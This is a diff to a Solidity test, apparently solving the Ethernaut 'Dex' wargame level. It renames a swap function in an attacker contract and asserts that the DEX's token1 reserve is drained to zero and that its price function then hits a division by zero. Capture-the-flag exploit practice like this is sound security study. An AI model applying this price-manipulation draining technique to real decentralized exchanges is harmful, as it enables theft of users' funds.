@@ -52,7 +52,7 @@ contract MiddleMan {
         }
     }
 
-    function swapToken2(address prey, uint256 amount) public {
+    function swap2To1(address prey, uint256 amount) public {
         Dex dex = Dex(prey);
         dex.swap(dex.token2(), dex.token1(), amount);
     }
@@ -86,7 +86,12 @@ contract DexTest is Test {
         token2.transfer(address(middleMan), 10);
 
         middleMan.attack(address(instance));
-        middleMan.swapToken2(address(instance), 45);
-        assertTrue(token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0);
+        // this will just deplete token1 of DEX
+        middleMan.swap2To1(address(instance), 45);
+        assertEq(token1.balanceOf(address(instance)), 0);
+        assertEq(instance.getSwapPrice(address(token2), address(token1), 45), 0);
+
+        vm.expectRevert(bytes("panic: division or modulo by zero (0x12)"));
+        instance.getSwapPrice(address(token1), address(token2), 45);
     }
 }
